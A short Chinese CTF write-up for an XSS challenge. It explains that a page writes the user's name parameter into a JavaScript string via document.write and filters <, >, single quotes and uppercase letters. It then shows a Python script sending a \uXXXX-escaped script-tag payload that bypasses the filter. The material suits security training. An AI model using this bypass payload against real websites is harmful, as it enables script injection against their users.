# 题目描述
The main goal is to execute a XSS with the string 'XSS' (capital) on it. For example: alert('XSS')

# 知识点
Cross-Site Scripting (XSS)

# 思路
/page 把用户传入的 name 原样插入到 JavaScript 字符串并通过 document.write 输出，未做正确的 JS 转义，造成 DOM XSS。黑名单只屏蔽了 <, >, ' 和大写字母，但可以用 JavaScript 的 Unicode 转义绕过过滤，使浏览器在解析字符串字面量时还原并执行

# 解题步骤

做了一些过滤

![image-x12094027905](./assets/image-x12094027905.png)

看代码就是过滤了`< > ' [ ] uppercase`

![image-x12093125952](./assets/image-x12093125952.png)

但是还是可以利用 JS 的 \uXXXX 转义在不触发黑名单（无大写字母、无 < >、无单引号）的情况下在脚本字面量里生成 \<script>alert('XSS')\</script>，从而执行并触发检查器返回 "XSS"。

# EXP

```python
import requests
payload = r"\u003cscript\u003ealert(\u0027\u0058\u0053\u0053\u0027)\u003c/script\u003e"
r = requests.get("http://ip32848/page", params={"name": payload}, timeout=5)
print(r.text)
```

![image-x12093159126](./assets/image-x12093159126.png)